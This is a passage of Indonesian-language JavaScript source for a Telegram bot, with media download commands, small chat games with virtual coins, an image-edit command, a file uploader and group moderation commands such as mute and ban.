        { params: { url: saved.url } }
      );

      if (!data.status) throw new Error("Download V4 gagal");

      res = data;

      const caption = `
🎵 TikTok Downloader V4

📌 Title : ${res.title || "No Title"}
👤 Author : ${res.author || "Unknown"}
`;

      if (res.download?.nowm) {
        await ctx.replyWithVideo(res.download.nowm, {
          caption: "🎬 Video No Watermark"
        });
      }

      else if (res.download?.wm) {
        await ctx.replyWithVideo(res.download.wm, {
          caption: "🎬 Video (Watermark)"
        });
      }

      if (res.download?.mp3) {
        await ctx.replyWithAudio(
          {
            url: res.download.mp3,
            filename: "tiktok.mp3"
          },
          {
            title: res.title || "TikTok Audio",
            performer: res.author || "TikTok"
          }
        );
      }

    }

    else if (version === "v1") {
      const { data } = await axios.get(
        `https://ikyyzyyrestapi.my.id/download/tiktok`,
        { params: { apikey: "kyzz", query: saved.url } }
      );

      if (!data.status) throw new Error("Download V1 gagal");

      res = data.result;

      const media = [];

      if (res.video) {
        media.push({ type: "video", media: res.video, caption: "🎵 TikTok Video" });
      }

      if (res.slides?.length) {
        res.slides.forEach((sl, idx) => {
          media.push({
            type: "photo",
            media: sl.img_result,
            caption: idx === 0 && !res.video ? "🎵 TikTok Slide" : undefined
          });
        });
      }

      for (let i = 0; i < media.length; i += 10) {
        const batch = media.slice(i, i + 10);

        if (batch.length === 1) {
          if (batch[0].type === "video") {
            await ctx.replyWithVideo(batch[0].media, { caption: batch[0].caption });
          } else {
            await ctx.replyWithPhoto(batch[0].media, { caption: batch[0].caption });
          }
        } else {
          await ctx.replyWithMediaGroup(
            batch.map(m => ({
              type: m.type,
              media: m.media,
              caption: m.caption
            }))
          );
        }
      }

      if (res.audio) {
        await ctx.replyWithAudio(res.audio, { caption: "🎵 Audio TikTok" });
      }
    }

    else if (version === "v2") {
      const { data } = await axios.get(
        `https://ikyyzyyrestapi.my.id/download/tiktokv2`,
        { params: { url: saved.url } }
      );

      if (!data.status) throw new Error("Download V2 gagal");

      res = data.result;

      const media = [];

      res.video?.forEach(v => media.push({ type: "video", media: v }));
      res.audio?.forEach(a => media.push({ type: "audio", media: a }));

      const caption = res.title ? `🎵 ${res.title}` : undefined;

      const videos = media.filter(m => m.type === "video");

      if (videos.length > 0) {
        for (let i = 0; i < videos.length; i += 10) {
          const slice = videos.slice(i, i + 10);
          await ctx.replyWithMediaGroup(
            slice.map((m, idx) => ({
              type: "video",
              media: m.media,
              caption: i === 0 && idx === 0 ? caption : undefined
            }))
          );
        }
      }

      const audios = media.filter(m => m.type === "audio");
      for (const a of audios) await ctx.replyWithAudio(a.media);
    }

    else if (version === "v3") {
      const { data } = await axios.get(
        `https://www.tikwm.com/api/`,
        { params: { url: saved.url } }
      );

      if (data.code !== 0) throw new Error("Download V3 gagal");

      res = data.data;

      const caption = `
🎵 TikTok Downloader

👤 Author : ${res.author.nickname}
📌 Title : ${res.title || "No Title"}
❤️ Likes : ${res.digg_count}
💬 Comments : ${res.comment_count}
🔁 Share : ${res.share_count}
`;

      await ctx.replyWithVideo(res.play, { caption });

      if (res.music) {
        await ctx.replyWithAudio(
          { url: res.music, filename: "tiktok.mp3" },
          {
            title: res.music_info?.title || "TikTok Audio",
            performer: res.music_info?.author || "TikTok",
            thumb: { url: res.music_info?.cover }
          }
        );
      }
    }

    await ctx.editMessageText(`✅ TikTok ${version.toUpperCase()} berhasil dikirim!`);

  } catch (err) {
    console.error(err);
    await ctx.editMessageText(`❌ Gagal download TikTok ${version.toUpperCase()}`);
  }

  delete memory[key];
});
//jadi anime
const gamess = new Map();

// command duel (HARUS REPLY)
bot.command("duel", async (ctx) => {
  if (!ctx.message.reply_to_message)
    return ctx.reply("❌ Reply pesan orang untuk ngajak duel");

  const opponent = ctx.message.reply_to_message.from;
  const player1 = ctx.from;

  if (opponent.id === player1.id)
    return ctx.reply("❌ Ga bisa lawan diri sendiri");

  const id = Date.now().toString();

  gamess.set(id, {
    p1: player1.id,
    p2: opponent.id,
    name1: player1.first_name,
    name2: opponent.first_name,
    hp1: 100,
    hp2: 100,
    turn: player1.id
  });

  ctx.reply(
    `⚔️ Duel dimulai!\n${player1.first_name} vs ${opponent.first_name}\n\nGiliran: ${player1.first_name}`,
    {
      reply_markup: getButtons(id)
    }
  );
});

// tombol action (tanpa Markup)
function getButtons(id) {
  return {
    inline_keyboard: [
      [
        { text: "⚔️ Attack", callback_data: `atk_${id}` },
        { text: "🛡️ Block", callback_data: `blk_${id}` },
        { text: "❤️ Heal", callback_data: `heal_${id}` }
      ]
    ]
  };
}

// handle action
bot.action(/(atk|blk|heal)_(.+)/, async (ctx) => {
  const action = ctx.match[1];
  const id = ctx.match[2];
  const game = gamess.get(id);

  if (!game) return ctx.answerCbQuery("Game selesai");

  const player = ctx.from.id;

  if (player !== game.turn)
    return ctx.answerCbQuery("Bukan giliran lu!");

  const isP1 = player === game.p1;
  const enemy = isP1 ? game.p2 : game.p1;

  let textLog = "";

  if (action === "atk") {
    let dmg = Math.floor(Math.random() * 20) + 10;

    if (isP1) game.hp2 -= dmg;
    else game.hp1 -= dmg;

    textLog = `⚔️ Serang! -${dmg} HP`;

  } else if (action === "heal") {
    let heal = Math.floor(Math.random() * 15) + 5;

    if (isP1) game.hp1 += heal;
    else game.hp2 += heal;

    textLog = `❤️ Heal +${heal} HP`;

  } else if (action === "blk") {
    textLog = `🛡️ Block! (aman dari serangan berikutnya)`;
    game.block = player; // simpan siapa yang block
  }

  // efek block
  if (game.block && action === "atk") {
    if (game.block !== player) {
      textLog = "🛡️ Serangan diblok!";
      game.block = null;
      // balikin damage
      if (isP1) game.hp2 += 0;
      else game.hp1 += 0;
    }
  }

  // batas HP max
  game.hp1 = Math.min(game.hp1, 100);
  game.hp2 = Math.min(game.hp2, 100);

  // cek menang
  if (game.hp1 <= 0 || game.hp2 <= 0) {
    const winner = game.hp1 <= 0 ? game.name2 : game.name1;

    gamess.delete(id);

    return ctx.editMessageText(
      `🏆 Pemenang: ${winner}\n\n${textLog}`
    );
  }

  // ganti turn
  game.turn = enemy;

  ctx.editMessageText(
      `⚔️ Duel\n\n` +
      `${game.name1} ❤️ ${game.hp1}\n` +
      `${game.name2} ❤️ ${game.hp2}\n\n` +
      `📢 ${textLog}\n\n` +
      `Giliran: ${game.turn === game.p1 ? game.name1 : game.name2}`,
    {
      reply_markup: getButtons(id)
    }
  );
});
///tebak

const coins = new Map();
const games = new Map();

function getCoin(id) {
  if (!coins.has(id)) coins.set(id, 1000);
  return coins.get(id);
}

function addCoin(id, amt) {
  coins.set(id, Math.max(0, getCoin(id) + amt));
}

const kuntul = (ms) => new Promise(r => setTimeout(r, ms));

// ================= CEK COIN =================
bot.command("coin", (ctx) => {
  ctx.reply(`💰 Coin kamu: ${getCoin(ctx.from.id)}`);
});

// ================= START GAME =================
bot.command("ultrabola", async (ctx) => {
  if (!ctx.message.reply_to_message)
    return ctx.reply("❌ Reply lawan!");

  const bet = parseInt(ctx.message.text.split(" ")[1]);
  if (!bet || bet <= 0)
    return ctx.reply("❌ Contoh: /ultrabola 100");

  const p1 = ctx.from;
  const p2 = ctx.message.reply_to_message.from;

  if (p1.id === p2.id)
    return ctx.reply("❌ Tidak bisa lawan diri sendiri!");

  if (getCoin(p1.id) < bet || getCoin(p2.id) < bet)
    return ctx.reply("❌ Coin tidak cukup!");

  const id = Date.now().toString();

  const msg = await ctx.reply(
    `⚽ ULTRA MATCH!\n${p1.first_name} vs ${p2.first_name}\n💰 Bet: ${bet}\n⏳ 30 detik`,
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🔥 ACCEPT", callback_data: `accept_${id}` },
            { text: "❌ TOLAK", callback_data: `reject_${id}` }
          ]
        ]
      }
    }
  );

  // auto expire
  const timeout = setTimeout(async () => {
    if (games.has(id)) {
      games.delete(id);
      try {
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          msg.message_id,
          null,
          "⌛ Duel expired!"
        );
      } catch {}
    }
  }, 30000);

  games.set(id, {
    p1,
    p2,
    bet,
    round: 1,
    maxRound: 5,
    turn: 1,
    score1: 0,
    score2: 0,
    kick: null,
    save: null,
    timeout
  });
});

// ================= ACCEPT =================
bot.action(/accept_(.+)/, async (ctx) => {
  const id = ctx.match[1];
  const g = games.get(id);
  if (!g) return;

  if (ctx.from.id !== g.p2.id)
    return ctx.answerCbQuery("Bukan kamu!");

  clearTimeout(g.timeout);

  // 💰 potong coin
  addCoin(g.p1.id, -g.bet);
  addCoin(g.p2.id, -g.bet);

  await ctx.editMessageText("🔥 MATCH DIMULAI!\nCek Private Chat!");

  startRound(id);
});

// ================= REJECT =================
bot.action(/reject_(.+)/, (ctx) => {
  const id = ctx.match[1];
  const g = games.get(id);
  if (!g) return;

  clearTimeout(g.timeout);
  games.delete(id);

  ctx.editMessageText("❌ Tantangan ditolak!");
});

// ================= START ROUND =================
function startRound(id) {
  const g = games.get(id);
  if (!g) return;

  sendKick(id);
  sendSave(id);
}

// ================= KICK =================
function sendKick(id) {
  const g = games.get(id);
  const player = g.turn === 1 ? g.p1 : g.p2;

  bot.telegram.sendMessage(
    player.id,
    `🎯 ROUND ${g.round}\nKamu PENENDANG`,
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "⬅️", callback_data: `kick_left_${id}` },
            { text: "⬆️", callback_data: `kick_mid_${id}` },
            { text: "➡️", callback_data: `kick_right_${id}` }
          ]
        ]
      }
    }
  ).catch(() => {});
}

// ================= SAVE =================
function sendSave(id) {
  const g = games.get(id);
  const keeper = g.turn === 1 ? g.p2 : g.p1;

  bot.telegram.sendMessage(
    keeper.id,
    `🧤 ROUND ${g.round}\nKamu KIPER`,
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "⬅️", callback_data: `save_left_${id}` },
            { text: "⬆️", callback_data: `save_mid_${id}` },
            { text: "➡️", callback_data: `save_right_${id}` }
          ]
        ]
      }
    }
  ).catch(() => {});
}

// ================= ACTION =================
bot.action(/kick_(left|mid|right)_(.+)/, (ctx) => {
  const dir = ctx.match[1];
  const id = ctx.match[2];
  const g = games.get(id);
  if (!g) return;

  const player = g.turn === 1 ? g.p1 : g.p2;
  if (ctx.from.id !== player.id)
    return ctx.answerCbQuery("Bukan giliran!");

  if (g.kick) return ctx.answerCbQuery("Sudah pilih!");

  g.kick = dir;
  ctx.answerCbQuery("⚽ Dipilih!");

  checkResolve(id);
});

bot.action(/save_(left|mid|right)_(.+)/, (ctx) => {
  const dir = ctx.match[1];
  const id = ctx.match[2];
  const g = games.get(id);
  if (!g) return;

  const keeper = g.turn === 1 ? g.p2 : g.p1;
  if (ctx.from.id !== keeper.id)
    return ctx.answerCbQuery("Bukan kamu!");

  if (g.save) return ctx.answerCbQuery("Sudah pilih!");

  g.save = dir;
  ctx.answerCbQuery("🧤 Dipilih!");

  checkResolve(id);
});

// ================= RESOLVE =================
function checkResolve(id) {
  const g = games.get(id);
  if (!g.kick || !g.save) return;

  resolveKick(id);
}

async function resolveKick(id) {
  const g = games.get(id);

  const kicker = g.turn === 1 ? g.p1 : g.p2;

  let msg = await bot.telegram.sendMessage(kicker.id, "⚽");

  const frames = ["⚽      🥅", "  ⚽    🥅", "    ⚽  🥅", "      ⚽🥅"];

  for (let f of frames) {
    await kuntul(300);
    await bot.telegram.editMessageText(kicker.id, msg.message_id, null, f);
  }

  let result;

  if (g.kick === g.save) {
    result = "🧤 DISAVE!";
  } else {
    result = "⚽ GOAL!";
    if (g.turn === 1) g.score1++;
    else g.score2++;
  }

  await bot.telegram.editMessageText(
    kicker.id,
    msg.message_id,
    null,
    `${frames[3]}

${result}

${g.p1.first_name}: ${g.score1}
${g.p2.first_name}: ${g.score2}`
  );

  g.kick = null;
  g.save = null;

  g.turn = g.turn === 1 ? 2 : 1;
  if (g.turn === 1) g.round++;

  if (g.round > g.maxRound) return endGame(id);

  startRound(id);
}

// ================= END =================
function endGame(id) {
  const g = games.get(id);
  if (!g) return;

  let winner;

  if (g.score1 > g.score2) winner = g.p1;
  else if (g.score2 > g.score1) winner = g.p2;

  if (!winner) {
    bot.telegram.sendMessage(g.p1.id, "🤝 Seri!");
    bot.telegram.sendMessage(g.p2.id, "🤝 Seri!");
  } else {
    addCoin(winner.id, g.bet * 2);

    const text = `🏆 ${winner.first_name} MENANG!
💰 +${g.bet * 2} coin
💳 Saldo: ${getCoin(winner.id)}`;

    bot.telegram.sendMessage(g.p1.id, text);
    bot.telegram.sendMessage(g.p2.id, text);
  }

  games.delete(id);
}

//snack video
bot.command("snackvid", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  const url = args[0];

  if (!url) {
    return ctx.reply(
      "❌ Gunakan format:\n/snackvid <url_snackvideo>\n\nContoh:\n/snackvid https://s.snackvideo.com/xxxxx"
    );
  }

  ctx.reply("⏳ Sedang mengambil video...").then((msg) => {

    const api = `https://api.siputzx.my.id/api/d/snackvideo?url=${encodeURIComponent(url)}`;

    axios.get(api)
      .then(async ({ data }) => {

        if (!data?.status || !data?.data?.videoUrl) {
          return ctx.reply("❌ Gagal mengambil video dari API.");
        }

        const v = data.data;

        const caption = `
🎬 *SNACKVIDEO DOWNLOADER*

📌 *Judul*:
${v.title || "-"}

📝 *Deskripsi*:
${v.description || "-"}

⏳ *Durasi* : ${v.duration || "-"}
👁 *Views* : ${v.interaction?.views?.toLocaleString() || "0"}
❤️ *Likes* : ${v.interaction?.likes?.toLocaleString() || "0"}
🔁 *Shares* : ${v.interaction?.shares?.toLocaleString() || "0"}

👤 *Creator* : ${v.creator?.name || "-"}
📅 *Upload* : ${v.uploadDate || "-"}
`.trim();

        // kirim video
        ctx.replyWithVideo(
          { url: v.videoUrl },
          {
            caption,
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [
                  {
                    text: "👤 Lihat Profil Creator",
                    url: v.creator?.profileUrl || "https://snackvideo.com"
                  }
                ]
              ]
            }
          }
        )
        .then(() => {
          ctx.deleteMessage(msg.message_id).catch(() => {});
        })
        .catch(() => {
          // fallback ke foto kalau video gagal
          ctx.replyWithPhoto(
            { url: v.thumbnail },
            {
              caption: caption + `\n\n🔗 Download:\n${v.videoUrl}`,
              parse_mode: "Markdown"
            }
          );

          ctx.deleteMessage(msg.message_id).catch(() => {});
        });

      })
      .catch((err) => {
        console.log("SnackVideo Error:", err.message);
        ctx.deleteMessage(msg.message_id).catch(() => {});
        ctx.reply("❌ Terjadi kesalahan saat mengambil video.");
      });

  });
});

/// GEMINI
bot.command(['spotify', 'playmusic', 'spplay'], async (ctx) => {
  const input = ctx.message.text.split(" ").slice(1).join(" ");

  if (!input) {
    return ctx.reply(
      "⚠️ Masukkan judul atau link"
    );
  }

  let loading;

  try {
    // loading message
    loading = await ctx.reply("🔍 Sedang mencari lagu.");

    const { data } = await axios.get(
      "https://ikyyzyyrestapi.my.id/search/spotifyplay",
      {
        params: { query: input },
        timeout: 30000
      }
    );

    if (!data.status || !data.result) {
      throw new Error("Lagu tidak ditemukan");
    }

    const {
      title,
      artist,
      album,
      duration,
      thumbnail,
      url,
      download
    } = data.result;

    // hapus loading
    await ctx.deleteMessage(loading.message_id).catch(() => {});

    const caption = `
🎧 *Spotify Player*

📌 Title : ${title}
👤 Artist : ${artist}
💿 Album : ${album}
⏱ Duration : ${duration}

🔗 Spotify :
${url}
`;

    // kirim thumbnail
    await ctx.replyWithPhoto(thumbnail, {
      caption,
      parse_mode: "Markdown"
    });

    // 🔥 langsung kirim audio URL (lebih ringan daripada buffer)
    await ctx.replyWithAudio(
      { url: download },
      {
        title: title,
        performer: artist
      }
    );

  } catch (err) {
    console.error("[SPOTIFY ERROR]", err.message);

    if (loading) {
      await ctx.deleteMessage(loading.message_id).catch(() => {});
    }

    ctx.reply("❌ Gagal mengambil lagu dari Spotify.");
  }
});
///cecanchina
bot.command("cecanchina", async (ctx) => {
  const msg = await ctx.reply("🔍 Lagi cari cecan China...");

  axios
    .get("http://ikyyzyyrestapi.my.id/random/cecan/china")
    .then(async (res) => {
      const data = res.data;

      // fleksibel handle response
      const img =
        data.result ||
        data.url ||
        data.data ||
        data;

      if (!img) {
        return ctx.reply("❌ Gagal ambil gambar");
      }

      await ctx.replyWithPhoto(
        { url: img },
        {
          caption: "🇨🇳 Random Cecan China"
        }
      );

      ctx.deleteMessage(msg.message_id).catch(() => {});
    })
    .catch((err) => {
      console.log(err.message);
      ctx.deleteMessage(msg.message_id).catch(() => {});
      ctx.reply("❌ API error / down");
    });
});
//cari grup
const grupCache = {};

// ================= COMMAND CARIGRUP =================
bot.command("carigrup", async (ctx) => {
  const query = ctx.message.text.split(" ").slice(1).join(" ");

  if (!query) {
    return ctx.reply(
      "⚠️ Masukkan kata kunci!\n\nContoh:\n/carigrup cari pacar"
    );
  }

  const processing = await ctx.reply("🔍 Sedang mencari grup...");

  axios.get("https://api.ikyzxz.my.id/api/search/grupwa", {
    params: { text: query }
  }).then(async (res) => {
    if (!res.data.status || !res.data.result?.result?.length) {
      return ctx.reply("❌ Grup tidak ditemukan");
    }

    const results = res.data.result.result;
    const key = Date.now().toString();

    // simpan cache + auto expired 1 menit
    const timeout = setTimeout(() => {
      delete grupCache[key];
    }, 60_000);

    grupCache[key] = {
      data: results,
      page: 0,
      timeout
    };

    await sendPageX(ctx, key);

  }).catch(err => {
    console.error(err.response?.data || err.message);
    ctx.reply("❌ Terjadi error saat mencari grup");
  }).finally(() => {
    ctx.deleteMessage(processing.message_id).catch(() => {});
  });
});

// ================= FUNCTION SEND PAGE =================
async function sendPageX(ctx, key, edit = false) {
  const perPage = 1;
  const cache = grupCache[key];
  if (!cache) return;

  const totalPage = Math.ceil(cache.data.length / perPage);
  const item = cache.data[cache.page];

  const caption = `
👥 *${item.nama}*

📝 Deskripsi:
${item.desc || "Tidak ada deskripsi"}

🔗 Link:
${item.link}

📄 Page ${cache.page + 1}/${totalPage}
`;

  const buttons = [
    [
      { text: "⬅️ Prev", callback_data: `grup_prev_${key}` },
      { text: "➡️ Next", callback_data: `grup_next_${key}` }
    ],
    [
      { text: "❌ Tutup", callback_data: `grup_close_${key}` }
    ]
  ];

  if (edit) {
    await ctx.editMessageMedia({
      type: "photo",
      media: item.thumbnail,
      caption,
      parse_mode: "Markdown"
    }, { reply_markup: { inline_keyboard: buttons } });
  } else {
    await ctx.replyWithPhoto(item.thumbnail, {
      caption,
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: buttons }
    });
  }
}

// ================= NAVIGASI =================
bot.action(/grup_next_(.+)/, async (ctx) => {
  const key = ctx.match[1];
  const cache = grupCache[key];
  if (!cache) return ctx.answerCbQuery("Data expired");

  const totalPage = Math.ceil(cache.data.length / 1);
  if (cache.page < totalPage - 1) cache.page++;

  await ctx.answerCbQuery();
  await sendPageX(ctx, key, true);
});

bot.action(/grup_prev_(.+)/, async (ctx) => {
  const key = ctx.match[1];
  const cache = grupCache[key];
  if (!cache) return ctx.answerCbQuery("Data expired");

  if (cache.page > 0) cache.page--;

  await ctx.answerCbQuery();
  await sendPageX(ctx, key, true);
});

// ================= CLOSE =================
bot.action(/grup_close_(.+)/, async (ctx) => {
  const key = ctx.match[1];
  const cache = grupCache[key];
  if (!cache) return ctx.answerCbQuery("Data expired");

  clearTimeout(cache.timeout); // stop auto-expire
  delete grupCache[key];

  await ctx.answerCbQuery("Ditutup");
  await ctx.deleteMessage().catch(() => {});
});
//nano
bot.command("nanobanana", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ");
  if (!args)
    return ctx.reply(
      "Reply Gambar Yang Ingin Di Ubah Dengan Prompt\nExample: /nanobanana ubahkan bajunya Menjadi Hitam"
    );

  let prompt = args;
  let url = null;

  // ambil dari reply foto
  if (ctx.message.reply_to_message?.photo) {
    const photo = ctx.message.reply_to_message.photo.slice(-1)[0];

    ctx.telegram.getFile(photo.file_id).then((file) => {
      url = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;
      processImage();
    });

  } else {
    processImage();
  }

  function processImage() {
    // ambil dari reply text
    if (!url && ctx.message.reply_to_message?.text) {
      const match = ctx.message.reply_to_message.text.match(/https?:\/\/\S+/);
      if (match) url = match[0];
    }

    // ambil dari args
    if (!url) {
      const match = args.match(/https?:\/\/\S+/);
      if (match) {
        url = match[0];
        prompt = args.replace(url, "").trim();
      }
    }

    if (!url) {
      return ctx.reply(
        "Reply gambar nya dengan prompt\n/nanobanana ubahkan bajunya menjadi hitam!"
      );
    }

    ctx.reply("Lagi proses bentar...").then((msg) => {
      axios
        .get("https://ikyyzyyrestapi.my.id/edit/nanobananav3", {
          params: { prompt, url },
          timeout: 60000,
        })
        .then(async ({ data }) => {
          if (!data.status || !data.result?.result_url) {
            return ctx.reply("❌ Gagal edit gambar");
          }

          const imgUrl = data.result.result_url;

          await ctx.replyWithPhoto(
            { url: imgUrl },
            {
              caption: `Done.\n\nPrompt: ${prompt}`,
            }
          );

          ctx.deleteMessage(msg.message_id).catch(() => {});
        })
        .catch((err) => {
          console.log(err.message);
          ctx.deleteMessage(msg.message_id).catch(() => {});
          ctx.reply("❌ Error saat proses gambar");
        });
    });
  }
});
///tourl
const uploadCache = {}; // cache sementara file user

// ================= COMMAND /TOURL =================
bot.command('tourl', async (ctx) => {
    const message = ctx.message.reply_to_message;
    const userId = ctx.from.id;

    if (!message || (!message.photo && !message.video && !message.document)) {
        return ctx.reply(
            '❌ Silakan reply foto/video/file dengan command /tourl', 
            { reply_to_message_id: ctx.message.message_id }
        );
    }

    // simpan file_id terakhir
    uploadCache[userId] = message.photo
        ? message.photo[message.photo.length - 1].file_id
        : (message.video?.file_id || message.document?.file_id);

    // kirim instruksi tombol manual tanpa Markup
    return ctx.reply(
        '🌐 Pilih host upload:', 
        {
            reply_to_message_id: ctx.message.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📦 Catbox', callback_data: 'upl_catbox' },
                        { text: '💧 Uguu', callback_data: 'upl_uguu' }
                    ]
                ]
            }
        }
    );
});

// ================= HANDLE BUTTON =================
bot.action(/^upl_(catbox|uguu)$/, async (ctx) => {
    const host = ctx.match[1];
    const userId = ctx.from.id;    
    const fileId = uploadCache[userId];

    if (!fileId) {
        return ctx.answerCbQuery('❌ Sesi kadaluarsa!', { show_alert: true });
    }

    try {
        await ctx.answerCbQuery(`Mengunggah ke ${host}...`);
        await ctx.editMessageText(`⏳ Memproses file untuk ${host.toUpperCase()}...`);

        const fileLink = await ctx.telegram.getFileLink(fileId);
        const responseFile = await axios.get(fileLink.href, { responseType: 'stream' });
        const fileName = fileLink.href.split('/').pop();

        const form = new FormData();
        form.append('file', responseFile.data, fileName);

        const { data } = await axios.post(`https://ikyyzyyrestapi.my.id/uploads?host=${host}`, form, {
            headers: { ...form.getHeaders() }
        });

        if (!data.status) throw new Error(data.error || 'API gagal merespon');

        const finalUrl = host === 'catbox' ? data.result : data.result?.files?.[0]?.url;

        delete uploadCache[userId];

        return ctx.editMessageText(
            `✅ Berhasil diupload!\n🌐 Host: ${host.toUpperCase()}\n🔗 URL: ${finalUrl}`,
            {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: 'Buka Link', url: finalUrl }]
                    ]
                }
            }
        );

    } catch (err) {
        console.error(err);
        const errMsg = err.response?.data?.error || err.message;
        return ctx.editMessageText(`❌ Gagal upload: ${errMsg}`);
    }
});
///END TOLLS MAIN
//START TOLLS
//Get Link Grup And CekLink
const groupLinks = new Map();

bot.command('getlink', async (ctx) => {
    const chatId = ctx.chat.id;
    const chatType = ctx.chat.type;
    
    if (chatType !== 'group' && chatType !== 'supergroup') {
        await ctx.reply('❌ Perintah ini hanya bisa digunakan di dalam grup!');
        return;
    }
    
    try {
        const loadingMsg = await ctx.reply('⏳ Mengambil link grup...');
        
        const link = await getGroupLink(chatId);
        
        if (!link) {
            await ctx.reply(
                '❌ Gagal mengambil link grup.\n\n' +
                'Pastikan bot adalah admin dengan izin:\n' +
                '✓ "Invite Users via Link"\n' +
                '✓ "Add Members"'
            );
            await ctx.deleteMessage(loadingMsg.message_id);
            return;
        }
        
        const expiredData = createExpiredLink(link, 5);
        
        groupLinks.set(chatId, expiredData);
        
        const expiredTime = expiredData.expiredAt.toLocaleTimeString('id-ID');
        
        await ctx.reply(
            `🔗 *Link Grup Berhasil Diambil!*\n\n` +
            `Link: ${link}\n\n` +
            `⏰ *Expired:* ${expiredTime} (5 menit)\n` +
            `📊 *Status:* Aktif\n\n` +
            `⚠️ Link akan otomatis expired setelah 5 menit!`,
            { parse_mode: 'Markdown' }
        );
        
        await ctx.deleteMessage(loadingMsg.message_id);
        
        setTimeout(async () => {
            const storedLink = groupLinks.get(chatId);
            if (storedLink && storedLink.link === link) {
                groupLinks.delete(chatId);
                
                await ctx.reply(
                    `⏰ *Link Grup Telah Expired!*\n\n` +
                    `Link yang sebelumnya dibagikan sudah tidak aktif.\n` +
                    `Gunakan /getlink untuk membuat link baru.`,
                    { parse_mode: 'Markdown' }
                );
            }
        }, 5 * 60 * 1000); // 5 menit
        
    } catch (error) {
        console.error('Error in /getlink:', error);
        await ctx.reply(
            '❌ Terjadi kesalahan.\n\n' +
            'Pastikan:\n' +
            '✓ Bot adalah admin grup\n' +
            '✓ Bot memiliki izin untuk membuat link\n' +
            '✓ Anda menggunakan perintah di dalam grup'
        );
    }
});

bot.command('ceklink', async (ctx) => {
    const chatId = ctx.chat.id;
    const storedLink = groupLinks.get(chatId);
    
    if (!storedLink) {
        await ctx.reply(
            '❌ *Tidak ada link aktif*\n\n' +
            'Belum ada link yang dibuat atau link sudah expired.\n' +
            'Gunakan /getlink untuk membuat link baru.',
            { parse_mode: 'Markdown' }
        );
        return;
    }
    
    const isExpired = storedLink.isExpired();
    
    if (isExpired) {
        groupLinks.delete(chatId);
        await ctx.reply(
            '⏰ *Link Sudah Expired!*\n\n' +
            'Link yang sebelumnya dibuat sudah tidak aktif.\n' +
            'Gunakan /getlink untuk membuat link baru.',
            { parse_mode: 'Markdown' }
        );
    } else {
        const remainingTime = Math.ceil((storedLink.expiredAt - new Date()) / 1000 / 60);
        const expiredTime = storedLink.expiredAt.toLocaleTimeString('id-ID');
        
        await ctx.reply(
            `🔗 *Status Link Grup*\n\n` +
            `Link: ${storedLink.link}\n` +
            `⏰ Expired: ${expiredTime}\n` +
            `⏱️ Sisa waktu: ${remainingTime} menit\n` +
            `📊 Status: ✅ *Aktif*`,
            { parse_mode: 'Markdown' }
        );
    }
});
///mute
bot.command('mute', async (ctx) => {
    if (ctx.chat.type !== 'group' && ctx.chat.type !== 'supergroup') {
        await ctx.reply('❌ Perintah ini hanya bisa digunakan di dalam grup!');
        return;
    }
    
    if (!await isAdmin(ctx)) {
        await ctx.reply('❌ Anda harus menjadi admin untuk melakukan mute!');
        return;
    }
    
    if (!await isBotAdmin(ctx)) {
        await ctx.reply('❌ Bot harus menjadi admin untuk melakukan mute!');
        return;
    }
    
    const result = await getTargetUser(ctx);
    if (result.error) {
        await ctx.reply(result.error);
        return;
    }
    
    const { targetUser, targetUserId } = result;
    
    try {
        await ctx.telegram.restrictChatMember(ctx.chat.id, targetUserId, {
            can_send_messages: false,
            can_send_media_messages: false,
            can_send_other_messages: false,
            can_add_web_page_previews: false
        });
        
        const userMention = targetUser.username 
            ? `@${targetUser.username}` 
            : `${targetUser.first_name}`;
        
        const message = `🔇 *${userMention}* telah di-mute! Tidak bisa mengirim pesan.`;
        
        if (ctx.message.reply_to_message) {
            await ctx.reply(message, { 
                parse_mode: 'Markdown',
                reply_to_message_id: ctx.message.reply_to_message.message_id
            });
        } else {
            await ctx.reply(message, { parse_mode: 'Markdown' });
        }
        
    } catch (error) {
        console.error('Error in /mute:', error);
        await ctx.reply('❌ Gagal memute user!');
    }
});
///ban
bot.command('ban', async (ctx) => {
    // Cek apakah di grup
    if (ctx.chat.type !== 'group' && ctx.chat.type !== 'supergroup') {
        await ctx.reply('❌ Perintah ini hanya bisa digunakan di dalam grup!');
        return;
    }
    
    // Cek apakah user adalah admin
    if (!await isAdmin(ctx)) {
        await ctx.reply('❌ Anda harus menjadi admin untuk melakukan ban!');
        return;
    }
    
    // Cek apakah bot adalah admin
    if (!await isBotAdmin(ctx)) {
        await ctx.reply('❌ Bot harus menjadi admin untuk melakukan ban!\n\nJadikan bot sebagai admin terlebih dahulu.');
        return;
    }
    
    // Dapatkan target user
    const result = await getTargetUser(ctx);
    if (result.error) {
        await ctx.reply(result.error);
        return;
    }
    
    const { targetUser, targetUserId, reason } = result;
    
    try {
        // Cek apakah target adalah admin
        const targetMember = await ctx.telegram.getChatMember(ctx.chat.id, targetUserId);
        if (targetMember.status === 'administrator' || targetMember.status === 'creator') {
            await ctx.reply('❌ Tidak bisa membanned admin atau creator grup!');
            return;
        }
        
        // Cek apakah target adalah bot itu sendiri
        if (targetUserId === ctx.botInfo.id) {
            await ctx.reply('❌ Tidak bisa membanned diri sendiri!');
            return;
        }
        
        // Ban user
        await ctx.telegram.banChatMember(ctx.chat.id, targetUserId);
        
        // Simpan data user yang dibanned
        const banReason = reason || 'Tidak ada alasan';
        bannedUsers.set(targetUserId, {
            id: targetUserId,
            username: targetUser.username,
            first_name: targetUser.first_name,
            last_name: targetUser.last_name,
            banned_at: new Date(),
            banned_by: ctx.from.id,
            banned_by_name: ctx.from.first_name,
            reason: banReason,
            chat_id: ctx.chat.id
        });
        
        // Format user mention
        const userMention = targetUser.username 
            ? `@${targetUser.username}` 
            : `${targetUser.first_name} ${targetUser.last_name || ''}`;
        
        // Kirim pesan konfirmasi dengan reply
        const message = 
            `✅ *USER BERHASIL DIBANNED!*\n\n` +
            `👤 *User:* ${userMention}\n` +
            `🆔 *ID:* ${targetUserId}\n` +
            `📝 *Alasan:* ${banReason}\n` +
            `👮 *Dibanned oleh:* ${ctx.from.first_name}\n\n` +
